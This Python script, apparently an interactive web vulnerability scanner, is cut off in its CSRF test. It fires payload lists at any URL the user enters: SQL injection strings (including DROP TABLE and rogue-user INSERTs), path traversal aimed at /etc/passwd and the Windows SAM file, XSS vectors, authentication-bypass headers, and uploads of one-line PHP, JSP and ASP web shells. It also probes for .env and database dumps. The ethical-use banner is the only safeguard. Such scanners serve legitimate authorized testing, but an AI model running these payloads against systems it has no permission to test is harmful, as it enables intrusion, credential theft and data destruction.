#!/usr/bin/env python3
"""
🛡️ Universal Web Security Vulnerability Scanner
Comprehensive security testing tool for web applications and APIs

⚠️  ETHICAL USE ONLY - Use only on systems you own or have explicit permission to test
"""

import requests
import time
import json
import random
import threading
from urllib.parse import urljoin, urlparse
from datetime import datetime
import sys
import os
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORS_AVAILABLE = True
except ImportError:
    COLORS_AVAILABLE = False
    class Fore:
        RED = GREEN = YELLOW = BLUE = CYAN = MAGENTA = WHITE = RESET = ""
    class Style:
        BRIGHT = DIM = RESET_ALL = ""

class UniversalSecurityScanner:
    def __init__(self):
        self.base_url = ""
        self.session = requests.Session()
        self.results = {
            'passed': 0,
            'failed': 0,
            'blocked': 0,
            'vulnerable': 0,
            'tests': []
        }
        self.config = {
            'timeout': 10,
            'delay': 0.5,
            'threads': 1,
            'user_agent': 'Mozilla/5.0 (compatible; SecurityScanner/1.0)',
            'verbose': False
        }
        
    def print_banner(self):
        """Print application banner"""
        banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════╗
║                    🛡️  UNIVERSAL SECURITY SCANNER                    ║
║                     Comprehensive Web Vulnerability Testing          ║
╚══════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}

{Fore.YELLOW}⚠️  ETHICAL USE DISCLAIMER ⚠️{Style.RESET_ALL}
This tool is for authorized security testing only.
Only use on systems you own or have explicit written permission to test.
Unauthorized testing may be illegal in your jurisdiction.
"""
        print(banner)
    def get_user_input(self):
        """Get comprehensive user input for testing configuration"""
        print(f"\n{Fore.GREEN}🔧 SCANNER CONFIGURATION{Style.RESET_ALL}")
        print("=" * 50)
        
        while True:
            target = input(f"{Fore.CYAN}Enter target URL (e.g., https://example.com): {Style.RESET_ALL}").strip()
            if target:
                if not target.startswith(('http://', 'https://')):
                    target = 'https://' + target
                try:
                    parsed = urlparse(target)
                    if parsed.netloc:
                        self.base_url = target.rstrip('/')
                        break
                    else:
                        print(f"{Fore.RED}❌ Invalid URL format{Style.RESET_ALL}")
                except:
                    print(f"{Fore.RED}❌ Invalid URL format{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}❌ URL is required{Style.RESET_ALL}")
        
        print(f"\n{Fore.GREEN}🎯 SELECT VULNERABILITY TESTS{Style.RESET_ALL}")
        test_options = {
            '1': 'SQL Injection Testing',
            '2': 'Path Traversal Testing', 
            '3': 'XSS (Cross-Site Scripting)',
            '4': 'Authentication Bypass',
            '5': 'Rate Limiting Tests',
            '6': 'Bot Detection Tests',
            '7': 'API Enumeration',
            '8': 'File Upload Security',
            '9': 'Information Disclosure',
            '10': 'CSRF Protection',
            '11': 'Security Headers Check',
            '12': 'SSL/TLS Security',
            'all': 'Run All Tests'
        }
        
        for key, value in test_options.items():
            print(f"  {key}. {value}")
        
        selected_tests = input(f"\n{Fore.CYAN}Select tests (comma-separated numbers or 'all'): {Style.RESET_ALL}").strip()
        
        if selected_tests.lower() == 'all':
            self.selected_tests = list(test_options.keys())[:-1]  # All except 'all'
        else:
            self.selected_tests = [t.strip() for t in selected_tests.split(',') if t.strip() in test_options]
        
        print(f"\n{Fore.GREEN}⚡ TEST INTENSITY{Style.RESET_ALL}")
        print("  1. Light (Basic payloads, slower)")
        print("  2. Medium (Standard payloads)")
        print("  3. Heavy (Comprehensive payloads, faster)")
        
        intensity = input(f"{Fore.CYAN}Select intensity (1-3, default: 2): {Style.RESET_ALL}").strip()
        
        if intensity == '1':
            self.config['delay'] = 1.0
            self.config['timeout'] = 15
            self.intensity = 'light'
        elif intensity == '3':
            self.config['delay'] = 0.2
            self.config['timeout'] = 5
            self.intensity = 'heavy'
        else:
            self.config['delay'] = 0.5
            self.config['timeout'] = 10
            self.intensity = 'medium'
        
        print(f"\n{Fore.GREEN}🔧 ADVANCED OPTIONS{Style.RESET_ALL}")
        
        verbose = input(f"{Fore.CYAN}Enable verbose output? (y/N): {Style.RESET_ALL}").strip().lower()
        self.config['verbose'] = verbose == 'y'
        
        custom_ua = input(f"{Fore.CYAN}Custom User-Agent (press Enter for default): {Style.RESET_ALL}").strip()
        if custom_ua:
            self.config['user_agent'] = custom_ua
        
        print(f"\n{Fore.YELLOW}📋 CONFIGURATION SUMMARY{Style.RESET_ALL}")
        print(f"Target: {self.base_url}")
        print(f"Tests: {len(self.selected_tests)} selected")
        print(f"Intensity: {self.intensity}")
        print(f"Verbose: {self.config['verbose']}")
        
        confirm = input(f"\n{Fore.CYAN}Proceed with testing? (y/N): {Style.RESET_ALL}").strip().lower()
        return confirm == 'y'
    def get_common_endpoints(self):
        """Return comprehensive list of common API endpoints"""
        return [
            '/api/auth/login', '/api/auth/register', '/api/auth/logout', '/api/auth/refresh',
            '/api/auth/forgot-password', '/api/auth/reset-password', '/api/auth/verify',
            '/api/users', '/api/users/profile', '/api/users/me', '/api/users/{id}',
            '/api/user', '/api/user/profile', '/api/user/settings', '/api/user/avatar',
            '/login', '/register', '/logout', '/signin', '/signup', '/auth',
            
            '/api/admin', '/api/admin/users', '/api/admin/dashboard', '/api/admin/settings',
            '/admin', '/admin/login', '/admin/dashboard', '/admin/users', '/admin/config',
            '/management', '/manager', '/control-panel', '/cp',
            
            '/api', '/api/v1', '/api/v2', '/api/v3', '/api/docs', '/api/swagger',
            '/docs', '/swagger', '/swagger-ui', '/api-docs', '/documentation',
            '/openapi.json', '/swagger.json', '/api.json', '/schema',
            
            '/.env', '/config', '/config.json', '/config.php', '/configuration',
            '/settings', '/env', '/environment', '/.config', '/app.config',
            
            '/api/db', '/database', '/db', '/mysql', '/postgres', '/mongodb',
            '/api/storage', '/storage', '/files', '/uploads', '/media',
            
            '/health', '/status', '/ping', '/api/health', '/api/status',
            '/heartbeat', '/alive', '/ready', '/metrics', '/stats',
            
            '/debug', '/api/debug', '/test', '/api/test', '/dev', '/development',
            '/console', '/shell', '/terminal', '/_debug', '/phpinfo.php',
            
            '/robots.txt', '/sitemap.xml', '/.htaccess', '/web.config',
            '/crossdomain.xml', '/clientaccesspolicy.xml', '/favicon.ico',
            
            '/backup', '/backups', '/.backup', '/backup.sql', '/database.sql',
            '/dump.sql', '/.git', '/.svn', '/temp', '/tmp', '/.tmp',
            
            '/wp-admin', '/wp-login.php', '/wp-config.php', '/wp-content',
            '/wp-includes', '/xmlrpc.php', '/wp-json', '/wp-api',
            
            '/api/products', '/api/orders', '/api/cart', '/api/checkout',
            '/api/payments', '/api/shipping', '/shop', '/store', '/cart',
            
            '/api/posts', '/api/pages', '/api/content', '/api/articles',
            '/api/blog', '/api/news', '/cms', '/content', '/blog',
            
            '/api/files', '/api/upload', '/api/download', '/upload', '/download',
            '/file-manager', '/filemanager', '/files', '/documents',
            
            '/api/search', '/search', '/api/analytics', '/analytics',
            '/api/reports', '/reports', '/api/logs', '/logs',
            
            '/api/messages', '/api/notifications', '/api/comments',
            '/api/social', '/api/chat', '/messages', '/notifications',
            
            '/api/webhooks', '/webhooks', '/api/integrations', '/integrations',
            '/api/callbacks', '/callbacks', '/api/external', '/external',
            
            '/api/mobile', '/mobile', '/api/app', '/app', '/api/ios', '/api/android',
            
            '/phpmyadmin', '/pma', '/mysql', '/adminer', '/phpinfo',
            '/server-status', '/server-info', '/.well-known', '/security.txt'
        ]
    def get_vulnerability_payloads(self):
        """Return comprehensive vulnerability payloads"""
        return {
            'sql_injection': [
                "' OR '1'='1", "' OR 1=1 --", "' OR 'a'='a", "' OR 1=1#",
                "admin'--", "admin'/*", "' OR 1=1 /*", "') OR '1'='1--",
                
                "' UNION SELECT NULL--", "' UNION SELECT 1,2,3--",
                "' UNION SELECT user(),version(),database()--",
                "' UNION ALL SELECT NULL,NULL,NULL--",
                
                "'; WAITFOR DELAY '00:00:05'--", "'; SELECT SLEEP(5)--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                
                "' AND 1=1--", "' AND 1=2--", "' AND SUBSTRING(@@version,1,1)='5'--",
                
                "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                
                "'; return true; var x='", "'; return 1==1; var x='",
                "[$ne]", "[$regex]", "[$where]", "'; return this.password.match(/.*/)//",
                
                "'; DROP TABLE users; --", "'; INSERT INTO users VALUES ('hacker','password'); --",
                "' OR (SELECT COUNT(*) FROM users) > 0 --", "' OR EXISTS(SELECT * FROM users WHERE username='admin')--"
            ],
            
            'path_traversal': [
                "../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc//passwd", "..%2f..%2f..%2fetc%2fpasswd",
                
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "..%252f..%252f..%252fetc%252fpasswd",
                "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cconfig%5csam",
                
                "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                
                "..%u2216..%u2216..%u2216etc%u2216passwd", "..\\u002e\\u002e\\u002fetc\\u002fpasswd",
                
                "../../../etc/passwd%00", "..\\..\\..\\windows\\system32\\config\\sam%00.txt",
                
                "....\\\\....\\\\....\\\\windows\\\\system32\\\\config\\\\sam",
                "..//////..//////..//////etc//////passwd",
                
                "../../../proc/self/environ", "../../../proc/version", "../../../proc/cmdline",
                "..\\..\\..\\boot.ini", "..\\..\\..\\windows\\win.ini",
                
                "../../../var/log/apache2/access.log", "../../../var/log/nginx/access.log",
                "../../../etc/apache2/apache2.conf", "../../../etc/nginx/nginx.conf"
            ],
            
            'xss': [
                "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>", "<iframe src=javascript:alert('XSS')></iframe>",
                
                "<body onload=alert('XSS')>", "<input onfocus=alert('XSS') autofocus>",
                "<select onfocus=alert('XSS') autofocus><option>test</option></select>",
                
                "javascript:alert('XSS')", "javascript:confirm('XSS')",
                "javascript:prompt('XSS')", "javascript:console.log('XSS')",
                
                "<ScRiPt>alert('XSS')</ScRiPt>", "<<SCRIPT>alert('XSS')//<</SCRIPT>",
                "<script>alert(String.fromCharCode(88,83,83))</script>",
                
                "\" onmouseover=\"alert('XSS')\"", "' onmouseover='alert(\"XSS\")'",
                "\" autofocus onfocus=\"alert('XSS')\"",
                
                "<style>@import'javascript:alert(\"XSS\")';</style>",
                "<link rel=stylesheet href=javascript:alert('XSS')>",
                
                "<iframe src=\"data:text/html,<script>alert('XSS')</script>\"></iframe>",
                "<object data=\"data:text/html,<script>alert('XSS')</script>\"></object>",
                
                "<svg><script>alert('XSS')</script></svg>",
                "<math><mi//xlink:href=\"data:x,<script>alert('XSS')</script>\">",
                "<details open ontoggle=alert('XSS')>",
                "<marquee onstart=alert('XSS')>XSS</marquee>"
            ]
        }
    def get_malicious_user_agents(self):
        """Return list of malicious/automated tool user agents"""
        return [
            "sqlmap/1.0", "sqlmap/1.4.12", "sqlninja/0.2.6-r1",
            
            "nikto/2.1.6", "Nikto/2.1.5", "w3af.org", "w3af/1.0",
            "OWASP ZAP", "zaproxy", "Burp Suite Professional",
            "Burp Suite Community Edition", "Acunetix Web Vulnerability Scanner",
            
            "Nmap Scripting Engine", "nmap", "masscan/1.0",
            
            "Metasploit", "Nessus", "OpenVAS", "Qualys",
            "Rapid7", "Tenable", "WhiteHat Security",
            
            "python-requests", "curl/7.68.0", "Wget/1.20.3",
            "libwww-perl", "Go-http-client", "Java/1.8",
            
            "scrapy", "BeautifulSoup", "mechanize",
            "PhantomJS", "HeadlessChrome", "Selenium",
            
            "bot", "crawler", "spider", "scraper",
            "harvest", "extract", "libwww", "urllib",
            
            "hack", "exploit", "vulnerability", "security",
            "test", "scan", "probe", "audit"
        ]
    
    def log_result(self, test_category, test_name, status, response_code, response_text="", details=""):
        """Log test results with color coding"""
        result = {
            'category': test_category,
            'test': test_name,
            'status': status,
            'response_code': response_code,
            'response_text': response_text[:200] + "..." if len(response_text) > 200 else response_text,
            'details': details,
            'timestamp': datetime.now().isoformat()
        }
        
        self.results['tests'].append(result)
        
        if status == 'BLOCKED':
            color = Fore.GREEN
            self.results['blocked'] += 1
        elif status == 'VULNERABLE':
            color = Fore.RED
            self.results['vulnerable'] += 1
        elif status == 'ALLOWED':
            color = Fore.YELLOW
        elif status == 'ERROR':
            color = Fore.MAGENTA
        else:
            color = Fore.WHITE
        
        if self.config['verbose'] or status in ['VULNERABLE', 'ERROR']:
            print(f"{color}  {status:10} | {test_name[:50]:50} | {response_code}{Style.RESET_ALL}")
            if details and self.config['verbose']:
                print(f"    Details: {details}")
    
    def test_sql_injection(self):
        """Test SQL injection vulnerabilities"""
        if '1' not in self.selected_tests:
            return
            
        print(f"\n{Fore.CYAN}🔍 Testing SQL Injection Vulnerabilities{Style.RESET_ALL}")
        payloads = self.get_vulnerability_payloads()['sql_injection']
        endpoints = self.get_common_endpoints()
        
        if self.intensity == 'light':
            payloads = payloads[:5]
            endpoints = endpoints[:10]
        elif self.intensity == 'medium':
            payloads = payloads[:15]
            endpoints = endpoints[:25]
        
        for payload in payloads:
            for endpoint in endpoints:
                try:
                    response = self.session.get(
                        urljoin(self.base_url, endpoint),
                        params={'id': payload, 'search': payload, 'q': payload},
                        headers={'User-Agent': self.config['user_agent']},
                        timeout=self.config['timeout']
                    )
                    
                    self.analyze_sql_response(f"SQL-GET {endpoint}", response, payload)
                    
                    response = self.session.post(
                        urljoin(self.base_url, endpoint),
                        json={'username': payload, 'password': 'test', 'email': payload},
                        headers={'User-Agent': self.config['user_agent']},
                        timeout=self.config['timeout']
                    )
                    
                    self.analyze_sql_response(f"SQL-POST {endpoint}", response, payload)
                    
                except requests.exceptions.RequestException as e:
                    self.log_result("SQL Injection", f"{endpoint}", "ERROR", 0, str(e))
                
                time.sleep(self.config['delay'])
    
    def analyze_sql_response(self, test_name, response, payload):
        """Analyze response for SQL injection indicators"""
        response_text = response.text.lower()
        
        if any(block_indicator in response_text for block_indicator in [
            'access denied', 'blocked', 'security', 'firewall', 'waf',
            'suspicious', 'malicious', 'injection', 'attack'
        ]) or response.status_code == 403:
            self.log_result("SQL Injection", test_name, "BLOCKED", response.status_code)
            return
        
        sql_errors = [
            'mysql_fetch_array', 'ora-01756', 'microsoft ole db provider',
            'unclosed quotation mark', 'quoted string not properly terminated',
            'sql syntax', 'mysql_num_rows', 'pg_query', 'sqlite_query',
            'division by zero', 'table doesn\'t exist', 'column not found'
        ]
        
        if any(error in response_text for error in sql_errors):
            self.log_result("SQL Injection", test_name, "VULNERABLE", response.status_code, 
                          f"SQL error detected with payload: {payload[:30]}...")
        elif response.status_code == 500:
            self.log_result("SQL Injection", test_name, "VULNERABLE", response.status_code,
                          f"Server error with payload: {payload[:30]}...")
        else:
            self.log_result("SQL Injection", test_name, "ALLOWED", response.status_code)
    def test_path_traversal(self):
        """Test path traversal vulnerabilities"""
        if '2' not in self.selected_tests:
            return
            
        print(f"\n{Fore.CYAN}📁 Testing Path Traversal Vulnerabilities{Style.RESET_ALL}")
        payloads = self.get_vulnerability_payloads()['path_traversal']
        
        if self.intensity == 'light':
            payloads = payloads[:5]
        elif self.intensity == 'medium':
            payloads = payloads[:15]
        
        for payload in payloads:
            try:
                response = self.session.get(
                    urljoin(self.base_url, "/api/files/"),
                    params={'file': payload, 'path': payload, 'filename': payload},
                    headers={'User-Agent': self.config['user_agent']},
                    timeout=self.config['timeout']
                )
                
                self.analyze_path_traversal_response(f"Path-Traversal", response, payload)
                
                response = self.session.get(
                    urljoin(self.base_url, f"/files/{payload}"),
                    headers={'User-Agent': self.config['user_agent']},
                    timeout=self.config['timeout']
                )
                
                self.analyze_path_traversal_response(f"Direct-Path", response, payload)
                
            except requests.exceptions.RequestException as e:
                self.log_result("Path Traversal", f"Path-{payload[:20]}...", "ERROR", 0, str(e))
            
            time.sleep(self.config['delay'])
    
    def analyze_path_traversal_response(self, test_name, response, payload):
        """Analyze response for path traversal indicators"""
        response_text = response.text.lower()
        
        if any(block_indicator in response_text for block_indicator in [
            'access denied', 'blocked', 'security', 'firewall',
            'path traversal', 'directory traversal', 'invalid path'
        ]) or response.status_code == 403:
            self.log_result("Path Traversal", test_name, "BLOCKED", response.status_code)
            return
        
        traversal_indicators = [
            'root:x:', 'daemon:x:', '[boot loader]', '[operating systems]',
            'windows registry editor', 'program files', 'system32',
            'etc/passwd', 'etc/shadow', 'boot.ini', 'win.ini'
        ]
        
        if any(indicator in response_text for indicator in traversal_indicators):
            self.log_result("Path Traversal", test_name, "VULNERABLE", response.status_code,
                          f"File content exposed with payload: {payload[:30]}...")
        elif response.status_code == 200 and len(response.text) > 100:
            self.log_result("Path Traversal", test_name, "ALLOWED", response.status_code)
        else:
            self.log_result("Path Traversal", test_name, "BLOCKED", response.status_code)
    
    def test_xss_vulnerabilities(self):
        """Test XSS vulnerabilities"""
        if '3' not in self.selected_tests:
            return
            
        print(f"\n{Fore.CYAN}🚨 Testing XSS Vulnerabilities{Style.RESET_ALL}")
        payloads = self.get_vulnerability_payloads()['xss']
        endpoints = ['/api/search', '/api/comments', '/api/posts', '/search', '/contact']
        
        if self.intensity == 'light':
            payloads = payloads[:5]
        elif self.intensity == 'medium':
            payloads = payloads[:15]
        
        for payload in payloads:
            for endpoint in endpoints:
                try:
                    response = self.session.get(
                        urljoin(self.base_url, endpoint),
                        params={'q': payload, 'search': payload, 'comment': payload},
                        headers={'User-Agent': self.config['user_agent']},
                        timeout=self.config['timeout']
                    )
                    
                    self.analyze_xss_response(f"XSS-GET {endpoint}", response, payload)
                    
                    response = self.session.post(
                        urljoin(self.base_url, endpoint),
                        json={'message': payload, 'comment': payload, 'content': payload},
                        headers={'User-Agent': self.config['user_agent']},
                        timeout=self.config['timeout']
                    )
                    
                    self.analyze_xss_response(f"XSS-POST {endpoint}", response, payload)
                    
                except requests.exceptions.RequestException as e:
                    self.log_result("XSS", f"{endpoint}", "ERROR", 0, str(e))
                
                time.sleep(self.config['delay'])
    
    def analyze_xss_response(self, test_name, response, payload):
        """Analyze response for XSS indicators"""
        response_text = response.text
        
        if any(block_indicator in response_text.lower() for block_indicator in [
            'access denied', 'blocked', 'security', 'xss', 'script blocked'
        ]) or response.status_code == 403:
            self.log_result("XSS", test_name, "BLOCKED", response.status_code)
            return
        
        if payload in response_text:
            self.log_result("XSS", test_name, "VULNERABLE", response.status_code,
                          f"Payload reflected: {payload[:50]}...")
        elif any(xss_tag in response_text.lower() for xss_tag in ['<script', '<img', '<svg', 'javascript:']):
            self.log_result("XSS", test_name, "VULNERABLE", response.status_code,
                          "XSS tags found in response")
        else:
            self.log_result("XSS", test_name, "BLOCKED", response.status_code)
    def test_bot_detection(self):
        """Test bot detection and blocking"""
        if '6' not in self.selected_tests:
            return
            
        print(f"\n{Fore.CYAN}🤖 Testing Bot Detection{Style.RESET_ALL}")
        malicious_agents = self.get_malicious_user_agents()
        
        if self.intensity == 'light':
            malicious_agents = malicious_agents[:10]
        elif self.intensity == 'medium':
            malicious_agents = malicious_agents[:20]
        
        for user_agent in malicious_agents:
            try:
                response = self.session.get(
                    urljoin(self.base_url, "/api/"),
                    headers={'User-Agent': user_agent},
                    timeout=self.config['timeout']
                )
                
                if any(block_indicator in response.text.lower() for block_indicator in [
                    'access denied', 'blocked', 'not allowed', 'forbidden',
                    'bot detected', 'automated tool'
                ]) or response.status_code == 403:
                    self.log_result("Bot Detection", f"Block {user_agent[:30]}...", "BLOCKED", response.status_code)
                else:
                    self.log_result("Bot Detection", f"Block {user_agent[:30]}...", "ALLOWED", response.status_code)
                    
            except requests.exceptions.RequestException as e:
                self.log_result("Bot Detection", f"{user_agent[:30]}...", "ERROR", 0, str(e))
            
            time.sleep(self.config['delay'])
    
    def test_api_enumeration(self):
        """Test API endpoint enumeration"""
        if '7' not in self.selected_tests:
            return
            
        print(f"\n{Fore.CYAN}🔍 Testing API Enumeration{Style.RESET_ALL}")
        endpoints = self.get_common_endpoints()
        
        if self.intensity == 'light':
            endpoints = endpoints[:20]
        elif self.intensity == 'medium':
            endpoints = endpoints[:50]
        
        for endpoint in endpoints:
            try:
                response = self.session.get(
                    urljoin(self.base_url, endpoint),
                    headers={'User-Agent': self.config['user_agent']},
                    timeout=self.config['timeout']
                )
                
                self.analyze_endpoint_response(endpoint, response)
                
            except requests.exceptions.RequestException as e:
                self.log_result("API Enumeration", endpoint, "ERROR", 0, str(e))
            
            time.sleep(self.config['delay'])
    
    def analyze_endpoint_response(self, endpoint, response):
        """Analyze endpoint response for information disclosure"""
        if response.status_code == 200:
            content = response.text.lower()
            sensitive_patterns = [
                'password', 'secret', 'key', 'token', 'api_key',
                'private_key', 'access_token', 'database', 'config',
                'admin', 'root', 'mysql', 'postgres'
            ]
            
            if any(pattern in content for pattern in sensitive_patterns):
                self.log_result("API Enumeration", endpoint, "VULNERABLE", response.status_code,
                              "Sensitive information exposed")
            elif len(response.text) > 100:
                self.log_result("API Enumeration", endpoint, "ALLOWED", response.status_code,
                              f"Endpoint accessible ({len(response.text)} bytes)")
            else:
                self.log_result("API Enumeration", endpoint, "ALLOWED", response.status_code)
        elif response.status_code == 404:
            self.log_result("API Enumeration", endpoint, "BLOCKED", response.status_code)
        elif response.status_code == 403:
            self.log_result("API Enumeration", endpoint, "BLOCKED", response.status_code)
        else:
            self.log_result("API Enumeration", endpoint, "ALLOWED", response.status_code)
    
    def test_rate_limiting(self):
        """Test rate limiting protection"""
        if '5' not in self.selected_tests:
            return
            
        print(f"\n{Fore.CYAN}⏱️ Testing Rate Limiting{Style.RESET_ALL}")
        
        endpoint = "/api/auth/login"
        rapid_requests = 15 if self.intensity == 'light' else 25 if self.intensity == 'medium' else 50
        blocked_count = 0
        
        print(f"Sending {rapid_requests} rapid requests...")
        
        for i in range(rapid_requests):
            try:
                response = self.session.post(
                    urljoin(self.base_url, endpoint),
                    json={'username': f'test{i}', 'password': 'password'},
                    headers={'User-Agent': self.config['user_agent']},
                    timeout=5
                )
                
                if response.status_code == 429 or "rate limit" in response.text.lower():
                    blocked_count += 1
                    
            except requests.exceptions.RequestException:
                blocked_count += 1
            
            time.sleep(0.1)
        
        if blocked_count > 0:
            self.log_result("Rate Limiting", f"Rapid Requests ({blocked_count}/{rapid_requests} blocked)", 
                          "BLOCKED", 429, f"Rate limiting active")
        else:
            self.log_result("Rate Limiting", f"Rapid Requests (0/{rapid_requests} blocked)", 
                          "VULNERABLE", 200, "No rate limiting detected")
    
    def test_authentication_bypass(self):
        """Test authentication bypass attempts"""
        if '4' not in self.selected_tests:
            return
            
        print(f"\n{Fore.CYAN}🔐 Testing Authentication Bypass{Style.RESET_ALL}")
        
        bypass_attempts = [
            {'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.invalid'},
            {'Authorization': 'Bearer null'},
            {'Authorization': 'Bearer ../../../etc/passwd'},
            {'Authorization': 'Bearer admin'},
            
            {'Cookie': 'sessionid=admin; csrftoken=bypass'},
            {'Cookie': 'sessionid=../../../etc/passwd'},
            {'Cookie': 'auth=true; admin=1'},
            
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Remote-Addr': '127.0.0.1'},
            {'X-Forwarded-User': 'admin'},
            {'X-User': 'admin'},
        ]
        
        protected_endpoints = ["/api/users/profile", "/api/submissions", "/api/admin"]
        
        if self.intensity == 'light':
            bypass_attempts = bypass_attempts[:5]
            protected_endpoints = protected_endpoints[:1]
        elif self.intensity == 'medium':
            bypass_attempts = bypass_attempts[:10]
            protected_endpoints = protected_endpoints[:2]
        
        for headers in bypass_attempts:
            for endpoint in protected_endpoints:
                try:
                    response = self.session.get(
                        urljoin(self.base_url, endpoint),
                        headers={**headers, 'User-Agent': self.config['user_agent']},
                        timeout=self.config['timeout']
                    )
                    
                    self.analyze_auth_bypass_response(f"Auth-Bypass {endpoint}", response, str(headers))
                    
                except requests.exceptions.RequestException as e:
                    self.log_result("Authentication Bypass", f"{endpoint}", "ERROR", 0, str(e))
                
                time.sleep(self.config['delay'])
    
    def analyze_auth_bypass_response(self, test_name, response, headers_info):
        """Analyze authentication bypass response"""
        if response.status_code in [401, 403]:
            self.log_result("Authentication Bypass", test_name, "BLOCKED", response.status_code)
        elif response.status_code == 200:
            content = response.text.lower()
            if any(protected in content for protected in ['profile', 'admin', 'dashboard', 'user']):
                self.log_result("Authentication Bypass", test_name, "VULNERABLE", response.status_code,
                              f"Bypass successful with: {headers_info[:50]}...")
            else:
                self.log_result("Authentication Bypass", test_name, "BLOCKED", response.status_code)
        else:
            self.log_result("Authentication Bypass", test_name, "BLOCKED", response.status_code)
    
    def test_file_upload_security(self):
        """Test file upload security"""
        if '8' not in self.selected_tests:
            return
            
        print(f"\n{Fore.CYAN}📤 Testing File Upload Security{Style.RESET_ALL}")
        
        malicious_files = [
            ('shell.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php'),
            ('script.js', 'alert("XSS")', 'application/javascript'),
            ('malware.exe', 'MZ\x90\x00\x03\x00\x00\x00', 'application/octet-stream'),
            ('config.conf', 'admin_password=secret123', 'text/plain'),
            ('../../../etc/passwd', 'root:x:0:0:root:/root:/bin/bash', 'text/plain'),
            ('test.svg', '<svg onload="alert(\'XSS\')">', 'image/svg+xml'),
            ('shell.jsp', '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>', 'application/x-jsp'),
            ('backdoor.asp', '<%eval request("cmd")%>', 'application/x-asp'),
        ]
        
        upload_endpoints = ["/api/upload", "/api/files", "/api/submissions", "/upload"]
        
        if self.intensity == 'light':
            malicious_files = malicious_files[:3]
            upload_endpoints = upload_endpoints[:2]
        elif self.intensity == 'medium':
            malicious_files = malicious_files[:5]
            upload_endpoints = upload_endpoints[:3]
        
        for filename, content, content_type in malicious_files:
            for endpoint in upload_endpoints:
                try:
                    files = {'file': (filename, content, content_type)}
                    response = self.session.post(
                        urljoin(self.base_url, endpoint),
                        files=files,
                        headers={'User-Agent': self.config['user_agent']},
                        timeout=self.config['timeout']
                    )
                    
                    self.analyze_file_upload_response(f"Upload-{filename}", response, filename)
                    
                except requests.exceptions.RequestException as e:
                    self.log_result("File Upload Security", f"Upload-{filename}", "ERROR", 0, str(e))
                
                time.sleep(self.config['delay'])
    
    def analyze_file_upload_response(self, test_name, response, filename):
        """Analyze file upload response"""
        response_text = response.text.lower()
        
        if any(block_indicator in response_text for block_indicator in [
            'blocked', 'denied', 'not allowed', 'invalid file', 'security',
            'malicious', 'dangerous', 'forbidden'
        ]) or response.status_code == 403:
            self.log_result("File Upload Security", test_name, "BLOCKED", response.status_code)
        elif response.status_code == 401:
            self.log_result("File Upload Security", test_name, "AUTH_REQUIRED", response.status_code)
        elif response.status_code == 200 and 'upload' in response_text:
            self.log_result("File Upload Security", test_name, "VULNERABLE", response.status_code,
                          f"Malicious file {filename} may have been uploaded")
        else:
            self.log_result("File Upload Security", test_name, "BLOCKED", response.status_code)
    
    def test_information_disclosure(self):
        """Test for information disclosure vulnerabilities"""
        if '9' not in self.selected_tests:
            return
            
        print(f"\n{Fore.CYAN}📋 Testing Information Disclosure{Style.RESET_ALL}")
        
        info_endpoints = [
            "/.env", "/config.json", "/config.php", "/web.config", "/.git/config",
            "/backup.sql", "/database.sql", "/dump.sql", "/config.php.bak",
            "/phpinfo.php", "/info.php", "/server-status", "/server-info",
            "/api/debug", "/api/config", "/api/env", "/debug", "/test",
            "/.htaccess", "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
            "/clientaccesspolicy.xml", "/.well-known/security.txt",
            "/package.json", "/composer.json", "/requirements.txt",
            "/Dockerfile", "/docker-compose.yml", "/.dockerignore"
        ]
        
        if self.intensity == 'light':
            info_endpoints = info_endpoints[:10]
        elif self.intensity == 'medium':
            info_endpoints = info_endpoints[:20]
        
        for endpoint in info_endpoints:
            try:
                response = self.session.get(
                    urljoin(self.base_url, endpoint),
                    headers={'User-Agent': self.config['user_agent']},
                    timeout=self.config['timeout']
                )
                
                self.analyze_info_disclosure_response(endpoint, response)
                
            except requests.exceptions.RequestException as e:
                self.log_result("Information Disclosure", endpoint, "ERROR", 0, str(e))
            
            time.sleep(self.config['delay'])
    
    def analyze_info_disclosure_response(self, endpoint, response):
        """Analyze information disclosure response"""
        if response.status_code == 404:
            self.log_result("Information Disclosure", endpoint, "BLOCKED", response.status_code)
            return
        
        if response.status_code == 200:
            content_lower = response.text.lower()
            sensitive_patterns = [
                'password', 'secret', 'key', 'token', 'database', 'mysql',
                'postgres', 'mongodb', 'redis', 'api_key', 'private_key',
                'secret_key', 'access_token', 'db_password', 'admin',
                'root', 'config', 'connection', 'credential'
            ]
            
            if any(pattern in content_lower for pattern in sensitive_patterns):
                self.log_result("Information Disclosure", endpoint, "VULNERABLE", response.status_code,
                              "Sensitive information exposed")
            elif len(response.text) > 100:
                self.log_result("Information Disclosure", endpoint, "ALLOWED", response.status_code,
                              f"File accessible ({len(response.text)} bytes)")
            else:
                self.log_result("Information Disclosure", endpoint, "ALLOWED", response.status_code)
        else:
            self.log_result("Information Disclosure", endpoint, "BLOCKED", response.status_code)
    
    def test_csrf_protection(self):
        """Test CSRF protection"""
        if '10' not in self.selected_tests:
            return
            
        print(f"\n{Fore.CYAN}🛡️ Testing CSRF Protection{Style.RESET_ALL}")
        
        csrf_tests = [
            ('POST', '/api/users/profile', {'name': 'Hacker', 'email': 'hacker@evil.com'}),
